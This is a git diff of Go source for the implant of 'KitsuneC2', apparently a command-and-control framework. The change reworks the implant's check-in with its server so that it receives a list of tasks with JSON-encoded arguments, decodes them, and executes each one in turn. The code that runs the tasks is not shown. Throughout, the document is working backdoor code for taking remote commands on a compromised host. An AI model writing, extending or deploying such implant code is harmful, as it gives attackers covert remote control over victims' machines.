@@ -3,7 +3,8 @@ package main
 import (
 	"KitsuneC2/lib/communication"
 	"KitsuneC2/lib/cryptography"
-	"fmt"
+	"encoding/json"
+	"errors"
 	"math"
 	"math/rand"
 	"net"
@@ -46,14 +47,16 @@ func kitsuneLoop() {
 			continue
 		}
 
-		receivedTask, taskArguments, err := checkIn(conn)
+		receivedTasksPtr, taskArgumentsPtr, err := checkIn(conn)
 		if err != nil {
 			conn.Close()
 			continue
 		}
-
-		go executeTask(receivedTask, taskArguments)
 		conn.Close()
+
+		for i := range *receivedTasksPtr {
+			executeTask((*receivedTasksPtr)[i], (*taskArgumentsPtr)[i])
+		}
 	}
 }
 
@@ -72,26 +75,45 @@ func initialize() error {
 	defer conn.Close()
 	err = SendEnvelopeToServer(conn, 0, msg)
 	if err != nil {
-		fmt.Println(err)
 		return err
 	}
 	return nil
 }
 
-// Sends message of type "ImplantCheckin" to server and returns (if any) a task with it's arguments.
-func checkIn(conn net.Conn) (int, interface{}, error) {
-	msg := communication.ImplantCheckin{ImplantId: implantId}
+// Sends message of type "ImplantCheckin" to server and returns (if any) a list of tasks with their arguments.
+func checkIn(conn net.Conn) (*[]int, *[]interface{}, error) {
+	msg := communication.ImplantCheckinReq{ImplantId: implantId}
 
 	err := SendEnvelopeToServer(conn, 1, msg)
 	if err != nil {
-		return -1, nil, err
+		return nil, nil, err
 	}
 
 	messageType, data, err := ReceiveEnvelopeFromServer(conn)
 	if err != nil {
-		return -1, nil, err
+		return nil, nil, err
 	}
-	return messageType, data, nil
+	if messageType != 2 {
+		return nil, nil, errors.New("Expected implantCheckinResp but got: " + strconv.Itoa(messageType))
+	}
+	checkInResp, ok := data.(*communication.ImplantCheckinResp)
+	if !ok {
+		return nil, nil, errors.New("could not convert message to ImplantCheckinResp")
+	}
+
+	//The checkInResp objects contains 2 arrays. The first int array contains the task types. The 2nd 2d byte array contains
+	//the arguments belonging to each task. We need to unmarshal the 2nd array to the corresponding taskArgument structs.
+	var argumentsAsStructs []interface{} = make([]interface{}, len(checkInResp.TaskArguments)) //Create a struct array with the length of the amount of arguments we received
+	for i := range argumentsAsStructs {
+		dataAsStruct := communication.MessageTypeToStruct[checkInResp.TaskIds[i]]() //Determine struct that we should unmarshal to based on TaskType
+		err = json.Unmarshal(checkInResp.TaskArguments[i], dataAsStruct)
+		if err != nil {
+			continue
+		}
+		argumentsAsStructs[i] = dataAsStruct //Assign unmarshalled struct to array
+	}
+
+	return &checkInResp.TaskIds, &argumentsAsStructs, nil
 }
 
 func executeTask(taskType int, arguments interface{}) {
